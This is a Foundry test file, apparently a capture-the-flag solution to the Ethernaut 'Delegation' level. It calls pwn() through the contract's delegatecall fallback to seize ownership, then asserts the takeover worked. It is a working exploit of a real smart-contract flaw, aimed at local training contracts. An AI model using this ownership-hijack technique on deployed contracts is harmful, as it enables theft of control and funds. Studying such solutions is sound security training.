// SPDX-License-Identifier: CC-BY-4.0
// bt3gl's solution to ethernaut

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Delegation, Delegate} from "src/06/Delegation.sol";


contract DelegationTest is Test {

    Delegate public delegate = new Delegate(makeAddr("owner"));
    Delegation public level = new Delegation(address(delegate));

    address instance = vm.addr(0x10053); 
    address hacker = vm.addr(0x1337); 

    function setUp() public {
        vm.prank(instance);
    }

    function testDelegationHack() public {

        vm.startPrank(hacker);
        assertNotEq(level.owner(), hacker);

        (bool success, ) = address(level).call(
            abi.encodeWithSignature("pwn()")
        );

        assertTrue(success);
        assertEq(level.owner(), hacker);

        vm.stopPrank();
        
    }
}